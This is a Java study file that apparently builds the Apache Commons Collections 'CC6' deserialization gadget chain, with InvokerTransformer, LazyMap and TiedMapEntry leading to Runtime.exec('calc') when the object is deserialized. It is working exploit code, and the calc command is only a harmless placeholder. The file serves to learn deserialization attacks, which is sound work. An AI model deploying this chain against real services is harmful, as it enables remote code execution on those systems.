import com.oracle.webservices.internal.api.databinding.DatabindingMode;
import com.sun.scenario.animation.shared.TimerReceiver;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.jetbrains.annotations.Async;

import javax.xml.ws.soap.Addressing;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * @BelongsProject: study_java
 * @BelongsPackage: PACKAGE_NAME
 * @Author: Clown
 * @CreateTime: 2023-07-09  11:13
 */
public class TestClass {
    public static void serialization(Object object)  throws Exception{
        FileOutputStream fileOutputStream = new FileOutputStream("URLDNS.txt");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(object);
        System.out.println("serialization方法成功执行");
    }

    public static void unserialization() throws Exception{
        FileInputStream fileInputStream = new FileInputStream("URLDNS.txt");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
        System.out.println("unserialization执行成功");
    }

    public static void main(String[] args) throws Exception {
//
//        Class c = Runtime.class;
//        Method getRuntime = c.getMethod("getRuntime", null);
//        Object invoke = getRuntime.invoke(null, null);
//        Method exec = c.getMethod("exec", String.class);
//        exec.invoke(invoke,"calc");//在invoke这个对象上调用exec执行calc方法

//        Method invokerTransformer1 = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}).transform(Runtime.class);
//        Runtime invoke = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}).transform(invokerTransformer1);
//        new InvokerTransformer("exec", new Class[] { String.class }, new String[] {"calc" }).transform(invoke);



        Transformer[] transformers = new Transformer[]{
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new String[] {"calc"}),
        };
        ChainedTransformer chainedTransformer =new ChainedTransformer(transformers);//通过调用Runtime的exec来命令执行

        Map map = new HashMap();

        Map decorate = LazyMap.decorate(map,new ConstantTransformer(1));


        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, Runtime.class);

        HashMap kvHashMap = new HashMap<>();
        kvHashMap.put(tiedMapEntry,"bbb");
        decorate.clear();

        Field clazz = Class.forName("org.apache.commons.collections.map.LazyMap").getDeclaredField("factory");
        clazz.setAccessible(true);
        clazz.set(decorate,chainedTransformer);

//        serialization(kvHashMap);
        unserialization();
    }
}
